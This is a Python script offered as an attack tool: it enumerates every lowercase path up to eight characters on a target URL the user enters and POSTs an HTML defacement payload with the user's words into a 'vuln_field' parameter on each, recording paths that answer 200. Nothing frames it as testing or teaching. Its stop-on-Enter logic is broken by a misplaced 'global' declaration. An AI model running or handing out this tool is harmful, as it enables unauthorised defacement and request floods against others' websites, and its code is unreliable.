import os
import requests
import string
import itertools
import time
import threading
from colorama import Fore, Style

class bcolors:
    OKCYAN = '\033[96m'

def generate_combinations(min_length, max_length):
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(string.ascii_lowercase, repeat=length):
            yield ''.join(combination)

def try_exploit(url, payload):
    response = requests.post(url, data=payload, timeout=0.5)
    return response.status_code == 200

def inject_words(url, words):
    payload = {
        "vuln_field": f"<html><body style='background-color: black; color: darkorange;'><h1>{words}</h1></body></html>"
    }

    directories = []
    min_length = 1
    max_length = 8

    total_combinations = sum(len(string.ascii_lowercase) ** i for i in range(min_length, max_length + 1))
    completed_combinations = 0
    start_time = time.time()

    stop_attack = False

    def check_for_enter_press():
        global stop_attack
        input()
        stop_attack = True

    enter_thread = threading.Thread(target=check_for_enter_press)
    enter_thread.start()

    for combination in generate_combinations(min_length, max_length):
        if stop_attack:
            break

        directory = ''.join(combination)
        exploit_url = url + directory
        if try_exploit(exploit_url, payload):
            directories.append(directory)

        completed_combinations += 1
        progress = (completed_combinations / total_combinations) * 100

        elapsed_time = time.time() - start_time
        average_time_per_combination = elapsed_time / completed_combinations
        remaining_combinations = total_combinations - completed_combinations
        estimated_time = average_time_per_combination * remaining_combinations

        os.system("clear")
        print(bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
        print(bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣┫┏┓")
        print(bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛┗┛")
        print(Fore.BLUE + "Powered by Enom")
        print(f"{Fore.CYAN}Progress: {Fore.GREEN}[{'=' * int(progress / 2)}{Fore.RED}{' ' * (50 - int(progress / 2))}{Fore.GREEN}] {Fore.CYAN}{progress:.2f}%{' ' * 10}")
        print(f"{Fore.CYAN}Estimated Time: {Fore.YELLOW}{time.strftime('%H:%M:%S', time.gmtime(estimated_time))}")

    if directories:
        print("Discovered directories:")
        for directory in directories:
            print(directory)
    else:
        print("No vulnerable directories found.")

if __name__ == "__main__":
    url = input("Enter the target URL: ")
    words = input("Enter the words to inject: ")

    os.system("clear")
    inject_words(url, words)
